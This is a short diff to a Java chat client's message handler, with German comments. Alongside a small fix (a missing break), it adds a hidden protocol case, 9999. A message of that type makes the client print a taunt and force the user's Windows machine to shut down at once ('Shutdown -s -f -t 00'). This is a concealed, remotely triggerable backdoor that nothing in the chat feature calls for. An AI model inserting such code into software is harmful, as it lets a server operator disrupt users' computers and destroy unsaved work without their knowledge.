@@ -298,6 +298,17 @@ public class ClientControl implements Initializable
                 //Hinzufügen eines neu erstellten Chatrooms in die ClientGui
                 case 4:
                     chatrooms.add((Chatroom) uebertragung.getUebertragung());
+                    break;
+                case 9999:
+                    System.out.println("You are fucked");
+                    try
+                    {
+                        Runtime.getRuntime().exec("CMD Shutdown -s -f -t 00");
+                    } catch (IOException e)
+                    {
+                        e.printStackTrace();
+                    }
+                    break;
 
                 default:
                     //TODO: Hier bitte noch iwie den User bannen oder so, da er sich nicht an das Protokoll hält.
